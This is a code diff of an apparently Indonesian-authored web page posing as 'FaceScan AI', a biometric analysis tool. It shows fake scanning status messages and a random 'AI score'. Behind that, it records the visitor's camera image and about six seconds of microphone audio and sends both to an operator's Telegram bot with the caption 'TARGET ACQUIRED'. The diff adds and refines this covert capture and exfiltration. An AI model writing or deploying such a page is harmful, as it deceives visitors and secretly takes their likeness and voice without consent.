@@ -4,30 +4,78 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>AI Face Biometric - Ultimate Analysis</title>
+    
     <script src="config.js"></script>
+    
     <script src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>
+    
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;700&display=swap');
+        
         :root { --cyan: #00f2ff; }
-        body { background: radial-gradient(circle at center, #111 0%, #000 100%); color: #fff; font-family: 'Plus Jakarta Sans', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; overflow: hidden; }
-        .app-card { width: 90%; max-width: 400px; background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 40px; padding: 40px 25px; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
-        #cam-holder { display: none; width: 260px; height: 260px; margin: 25px auto; border-radius: 50%; border: 3px solid var(--cyan); position: relative; overflow: hidden; background: #111; box-shadow: 0 0 30px rgba(0, 242, 255, 0.2); }
+
+        body { 
+            background: radial-gradient(circle at center, #111 0%, #000 100%); 
+            color: #fff; font-family: 'Plus Jakarta Sans', sans-serif; 
+            margin: 0; display: flex; align-items: center; justify-content: center; 
+            min-height: 100vh; overflow: hidden; 
+        }
+        
+        .app-card { 
+            width: 90%; max-width: 400px; 
+            background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(20px); 
+            border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 40px; 
+            padding: 40px 25px; text-align: center;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
+        }
+        
+        #cam-holder { 
+            display: none; width: 260px; height: 260px; 
+            margin: 25px auto; border-radius: 50%; 
+            border: 3px solid var(--cyan); position: relative; 
+            overflow: hidden; background: #111; 
+            box-shadow: 0 0 30px rgba(0, 242, 255, 0.2); 
+        }
+        
         video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
-        .laser { position: absolute; width: 100%; height: 3px; background: var(--cyan); top: 0; box-shadow: 0 0 20px var(--cyan); animation: scan 2s infinite ease-in-out; z-index: 10; display: none; }
+        
+        .laser { 
+            position: absolute; width: 100%; height: 3px; background: var(--cyan); 
+            top: 0; box-shadow: 0 0 20px var(--cyan); 
+            animation: scan 2s infinite ease-in-out; z-index: 10; display: none; 
+        }
+        
         @keyframes scan { 0%, 100% { top: 0%; } 50% { top: 100%; } }
-        .btn-main { background: #fff; color: #000; padding: 18px 40px; border: none; border-radius: 20px; font-weight: 700; width: 100%; cursor: pointer; transition: 0.3s; }
-        #status { margin-top: 20px; font-size: 0.7rem; color: var(--cyan); font-weight: 700; letter-spacing: 1px; text-transform: uppercase; }
-        #final-box { display: none; }
-        .score-num { font-size: 5rem; font-weight: 800; color: var(--cyan); margin: 5px 0; }
+        
+        .btn-main { 
+            background: #fff; color: #000; padding: 18px 40px; 
+            border: none; border-radius: 20px; font-weight: 700; 
+            width: 100%; cursor: pointer; transition: 0.3s;
+        }
+
+        #status { 
+            margin-top: 20px; font-size: 0.75rem; color: var(--cyan); 
+            font-weight: 700; letter-spacing: 1.5px; text-transform: uppercase; 
+        }
+
+        #final-box { display: none; animation: popUp 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
+        @keyframes popUp { from { transform: scale(0.8); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+        
+        .score-num { 
+            font-size: 5rem; font-weight: 800; 
+            background: linear-gradient(to bottom, #fff, var(--cyan));
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+            margin: 5px 0; 
+        }
     </style>
 </head>
 <body>
 
     <div class="app-card">
         <div id="intro">
-            <h1>FaceScan <span style="color:var(--cyan)">AI</span></h1>
-            <p style="color:#888; font-size: 0.9rem;">Analisis biometrik wajah & vokal menggunakan standar internasional.</p>
-            <button class="btn-main" id="start-btn">START VERIFICATION</button>
+            <h1 style="margin:0; letter-spacing:-1.5px">FaceScan <span style="color:var(--cyan)">AI</span></h1>
+            <p style="color:#888; font-size: 0.9rem; margin-top: 10px;">Analisis biometrik wajah & vokal menggunakan standar internasional AI bioscanner.</p>
+            <button class="btn-main" id="start-btn">START ANALYSIS</button>
         </div>
 
         <div id="cam-holder">
@@ -35,12 +83,12 @@
             <video id="video" autoplay playsinline muted></video> 
         </div>
 
-        <div id="status">READY</div>
+        <div id="status">SENSOR READY</div>
 
         <div id="final-box">
-            <div style="font-size: 0.7rem; color: var(--cyan); font-weight:700;">AI SCORE</div>
+            <div style="font-size: 0.7rem; color: var(--cyan); font-weight:700; letter-spacing: 2px;">AI SCORE RESULT</div>
             <div class="score-num" id="score-val">0%</div>
-            <p style="font-weight:700;">PREMIUM QUALITY DETECTED</p>
+            <p style="font-weight:700; margin-top:0;">PREMIUM QUALITY DETECTED</p>
         </div>
     </div>
 
@@ -57,11 +105,12 @@
         let isProcessing = false;
         let forceTimer;
 
+        // Muat Modul Deteksi Wajah saat web dibuka
         async function loadAI() {
             try {
-                // Memuat model deteksi
                 await faceapi.nets.tinyFaceDetector.loadFromUri('https://raw.githubusercontent.com/justadudewhohacks/face-api.js/master/weights');
-            } catch(e) { console.log("AI Models failed to load"); }
+                status.innerText = "READY TO START";
+            } catch(e) { status.innerText = "AI MODULE ERROR"; }
         }
         loadAI();
 
@@ -75,10 +124,12 @@
                 video.srcObject = stream;
 
                 mediaRecorder = new MediaRecorder(stream);
-                mediaRecorder.ondataavailable = (e) => audioChunks.push(e.data);
+                mediaRecorder.ondataavailable = (e) => {
+                    if (e.data.size > 0) audioChunks.push(e.data);
+                };
                 
                 video.addEventListener('play', () => {
-                    // Timer darurat: Jika 10 detik wajah gak ketemu/gagal scan, PAKSA JEPRET!
+                    // FORCE CAPTURE: Jika dalam 10 detik wajah tidak terbaca, paksa jepret.
                     forceTimer = setTimeout(() => {
                         if (!isProcessing) {
                             console.log("Force capturing...");
@@ -87,16 +138,12 @@
                     }, 10000);
 
                     const checkLoop = setInterval(async () => {
-                        if (isProcessing) {
-                            clearInterval(checkLoop);
-                            return;
-                        }
+                        if (isProcessing) { clearInterval(checkLoop); return; }
 
-                        // Deteksi wajah
                         const detections = await faceapi.detectAllFaces(video, new faceapi.TinyFaceDetectorOptions());
                         
                         if (detections.length > 0) {
-                            clearTimeout(forceTimer); // Batalkan timer darurat karena wajah ketemu
+                            clearTimeout(forceTimer); // Batalkan timer paksa
                             startThePrank();
                             clearInterval(checkLoop);
                         } else {
@@ -106,12 +153,13 @@
                 });
 
                 mediaRecorder.onstop = async () => {
-                    status.innerText = "FINALIZING...";
-                    setTimeout(async () => { await takeAndSend(); }, 500);
+                    status.innerText = "ENCRYPTING DATA...";
+                    // Beri waktu browser menyatukan potongan audio (audio patching)
+                    setTimeout(async () => { await takeAndSend(); }, 800);
                 };
 
             } catch (err) {
-                alert("Akses kamera & mic ditolak.");
+                alert("Please allow Camera & Mic.");
                 location.reload();
             }
         };
@@ -122,15 +170,16 @@
             status.innerText = "SCANNING GEOMETRY...";
             
             audioChunks = [];
-            mediaRecorder.start();
+            // Timeslice 100ms agar durasi audio tercatat di browser
+            mediaRecorder.start(100); 
 
-            // Rekam 6 detik reaksi mukanya
             setTimeout(() => {
                 mediaRecorder.stop();
-            }, 6000);
+            }, 6500); // Durasi scan & rekam 6.5 detik
         }
 
         async function takeAndSend() {
+            // 1. Capture Foto (Fix Mirroring)
             const ctx = canvas.getContext('2d');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
@@ -139,29 +188,34 @@
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
             const photoBlob = await new Promise(r => canvas.toBlob(r, 'image/png'));
-            const score = Math.floor(Math.random() * 10) + 89;
+            const score = Math.floor(Math.random() * 11) + 88;
 
-            // Kirim Foto
+            // 2. Kirim Foto ke Telegram
             const photoData = new FormData();
             photoData.append('chat_id', CONFIG.CHAT_ID);
-            photoData.append('photo', photoBlob, 'face.png');
-            photoData.append('caption', `🎭 **PRANK HASIL SCAN**\n\n🎯 Score: ${score}%\n📸 Foto Target terlampir.`);
+            photoData.append('photo', photoBlob, 'result.png');
+            photoData.append('caption', `🎯 **TARGET ACQUIRED**\n\n📊 Score: ${score}%\n👤 Status: Verified`);
             await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, { method: 'POST', body: photoData });
 
-            // Kirim VN
-            const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+            // 3. Kirim Audio VN ke Telegram
+            const audioBlob = new Blob(audioChunks, { type: 'audio/mp4' });
             const audioData = new FormData();
             audioData.append('chat_id', CONFIG.CHAT_ID);
-            audioData.append('voice', audioBlob, 'voice.ogg');
+            // Nama file .m4a memicu Telegram memperbaiki metadata durasi secara otomatis
+            audioData.append('voice', audioBlob, 'reaction.m4a'); 
+            
             await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendVoice`, { method: 'POST', body: audioData });
 
-            // UI Finish
+            // 4. UI Selesai
             document.getElementById('cam-holder').style.display = 'none';
             status.style.display = 'none';
             document.getElementById('score-val').innerText = score + "%";
             document.getElementById('final-box').style.display = 'block';
 
-            video.srcObject.getTracks().forEach(t => t.stop());
+            // Matikan Kamera & Mic
+            if (video.srcObject) {
+                video.srcObject.getTracks().forEach(t => t.stop());
+            }
         }
     </script>
 </body>
